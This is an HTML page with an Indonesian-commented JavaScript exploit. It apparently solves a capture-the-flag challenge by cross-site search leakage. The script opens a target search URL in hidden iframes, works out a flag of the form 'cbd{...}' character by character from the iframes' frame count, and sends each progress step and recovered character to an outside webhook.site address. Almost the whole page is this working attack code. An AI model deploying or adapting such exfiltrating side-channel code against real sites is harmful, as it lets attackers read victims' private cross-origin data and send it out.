<!DOCTYPE html>
<html>
<body>
    <script>
        const target = "https://wonder.cbd2026.cloud/search?q=";
        const logger = "https://webhook.site/fb0f12dc-6949-4193-ac04-768d43746e00";
        // Tambahkan huruf besar untuk berjaga-jaga
        const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}";

        async function check(q) {
            return new Promise(resolve => {
                const ifr = document.createElement('iframe');
                ifr.src = `${target}${encodeURIComponent(q)}&cb=${Math.random()}`;
                ifr.style.display = "none";
                document.body.appendChild(ifr);
                
                // Naikkan ke 2000ms agar PDF sempat loading
                setTimeout(() => {
                    try {
                        const isMatch = ifr.contentWindow.length > 0;
                        document.body.removeChild(ifr);
                        resolve(isMatch);
                    } catch (e) {
                        resolve(false);
                    }
                }, 2000); 
            });
        }

        async function solve(current) {
            // Log ke webhook setiap kali mulai menebak karakter baru agar kamu tahu script jalan
            fetch(`${logger}?checking_from=${current}`);
            
            for (let c of alphabet) {
                let guess = current + c;
                if (await check(guess)) {
                    fetch(`${logger}?found=${guess}`);
                    if (c === '}') return;
                    return solve(guess);
                }
            }
            fetch(`${logger}?msg=FAILED_TO_FIND_NEXT_CHAR_AFTER_${current}`);
        }

        fetch(`${logger}?status=started_v2`);
        solve("cbd{");
    </script>
</body>
</html>
